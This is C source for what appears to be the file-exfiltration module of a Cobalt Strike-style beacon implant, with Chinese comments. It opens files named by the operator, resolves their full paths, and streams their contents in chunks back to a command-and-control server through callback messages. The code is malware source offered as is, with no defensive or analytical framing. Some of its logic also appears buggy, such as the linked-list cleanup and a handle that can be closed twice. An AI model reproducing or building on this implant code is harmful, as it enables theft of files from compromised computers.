#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include "commands.h"
#include "parse.h"
#include "bformat.h"
#include "beacon.h"
#include <WinSock2.h>

typedef struct {
	unsigned int    id;
	unsigned int    toread;
	FILE * handle;
 	void * next;
} file_entry;

/* 跟踪我们的套接字 */
static file_entry * download_list = NULL; /* TODO: download_poll() cleans this list but on exit if pending downloads would not be cleaned up */

/* 跟踪下载标识符 */
static unsigned int download_id = 0;

/* 用于读取文件的共享缓冲区 */
static char * read_buffer = NULL;        /* TODO: this is not cleaned up on exit, probably does not need to be masked. */

/* 我们需要在几个关键位置执行此操作！ */
void process_close(file_entry * entry, void(*callback)(char * buffer, int length, int type));

/* 下载一些内容 */
void command_download(char * buffer, int length, void (*callback)(char * data, int length, int type)) {
	file_entry * entry = NULL;
	FILE * infile;
	char * fname;				/* 用户提供的文件名 */
	char * fullname;			/* 文件的完整路径 */
	__int64      fsz;
	unsigned int nsz;

	datap * chunk;

	datap   parser;
	formatp builder;

	/* 分配所需内存 */
	chunk    = data_alloc(4096);
	fname    = data_ptr(chunk, 2048);
	fullname = data_ptr(chunk, 2048);

	/* 确定文件名 */
	data_init(&parser, buffer, length);
	data_string_oneoff(&parser, fname, 2048);

	/* 打开文件以供读取 */
	infile = fopen(fname, "rb");
	if (infile == INVALID_HANDLE_VALUE || infile == NULL) {
		post_error_s(0x28, fname);
		data_free(chunk);
		return;
	}

	/* 计算文件大小（存储在fsz中） */
	fseek(infile, 0L, SEEK_END);
	fsz = _ftelli64(infile);
	fseek(infile, 0L, SEEK_SET);

	/* 如果这部分失败，请向用户报告错误 */
	if (fsz <= 0 || fsz > 0xffffffffLL) {
		post_error_s(0x3c, fname);
		data_free(chunk);
		fclose(infile);
		return;
	}

	/* 获取文件的完整路径 */
	nsz = GetFullPathNameA(fname, 2048, fullname, NULL);
	if (nsz == 0 || nsz > 2048) {
		post_error_s(0x3d, fname);
		data_free(chunk);
		fclose(infile);
		return;
	}

	/* 创建新的下载条目（现在是个好时机） */
/* 此条目在download_pull()中完全处理或停止后释放 */
	entry = (file_entry *)malloc(sizeof(file_entry));
	entry->handle = infile;
	entry->id     = download_id;
	entry->toread = fsz;
	entry->next   = download_list;
	download_list = entry;

	/* 递增ID，使每个文件下载获得唯一标识符 */
	download_id++;

	/* CALLBACK_FILE
 *   int4             = 下载标识符
 *   int4             = 文件大小
 *   char[..length..] = 文件名（完整路径）
 */
	bformat_init(&builder, 4096);
	bformat_int(&builder, entry->id);
	bformat_int(&builder, fsz);
	bformat_copy(&builder, fullname, nsz);

	/* 发送数据... */
	callback(bformat_string(&builder), bformat_length(&builder), CALLBACK_FILE);

	/* 清理资源 */
	bformat_free(&builder);
	data_free(chunk);

	/* 检查是否已经完成... */
	if (fsz == 0)
		process_close(entry, callback);
}

void process_download(file_entry * entry, void (*callback)(char * buffer, int length, int type), int max) {
	unsigned int temp;
	unsigned int len = 0;
	unsigned int readme = 0;

	/* 确保我们有一个读取缓冲区...我们的下载需要它 */
	if (read_buffer == NULL) {
		read_buffer = (char *)malloc(MAX_PACKET + 4);
	}

	/* 将下载ID复制到读取缓冲区 */
	temp = htonl(entry->id);
	memcpy(read_buffer, (char *)&temp, 4);

	/* 我们想要读取多少数据？ */
	if (entry->toread > max) {
		readme = max;
	}
	else {
		readme = entry->toread;
	}

	/* 如果有大量数据要读取，尽可能多地读取 */
	while (readme > 0) {
		temp = fread(read_buffer + 4 + len, 1, readme, entry->handle);
		/* 检查文件下载过程中是否发生错误...这很重要，因为如果不捕获这个错误，
           会导致无限循环。C2控制器需要对CALLBACK_FILE_CLOSE作出反应，
           以检查接收数据<大小并推断发生了错误 */
		if (temp == 0) {
			entry->toread = 0;
			break;
		}
		len += temp;
		readme -= temp;
		entry->toread -= temp;
	}

	/* 将所有数据发送回家 */
	callback(read_buffer, len + 4, CALLBACK_FILE_WRITE);

	/* 如果需要则关闭文件 */
	process_close(entry, callback);
}

void process_close(file_entry * entry, void(*callback)(char * buffer, int length, int type)) {
	/* 处理这个... */
	unsigned int temp;

	/* 如果需要则关闭文件 */
	if (entry->toread <= 0) {
		temp = htonl(entry->id);
		callback((char *)&temp, 4, CALLBACK_FILE_CLOSE);
		fclose(entry->handle);
	}
}

void command_download_stop(char * buffer, int length) {
	unsigned int fid;
	file_entry * entry = download_list;

	/* 将4字节复制到我们的文件ID */
	memcpy(&fid, buffer, 4);
	fid = ntohl(fid);

	while (entry != NULL) {
		if (entry->id == fid) {
			/* 使我们不再处理这个文件下载 */
			entry->toread = 0;

			/* 请关闭句柄 */
			fclose(entry->handle);
		}
		entry = (file_entry*)entry->next;
	}
}

/* 轮询打开的文件。读取一些数据。发送给客户端 */
void download_poll(void (*callback)(char * buffer, int length, int type), int max) {
	file_entry * entry = download_list;
	file_entry * prev  = NULL;

	/* 处理下载 */
	while (entry != NULL) {
		if (entry->toread > 0) {
			process_download(entry, callback, max);
		}
		entry = (file_entry*)entry->next;
	}

	/* 请清理我们的链表 */
	entry = download_list;
	while (entry != NULL) {
		if (entry->toread <= 0) {
			if (prev == NULL) {
				download_list = (file_entry*)entry->next;
				free(entry);
				entry = NULL;
			}
			else {
				prev->next = entry->next;
				free(entry);
				entry = (file_entry*)prev->next;
			}
		}
		else {
			prev  = entry;
			entry = (file_entry*)entry->next;
		}
	}
}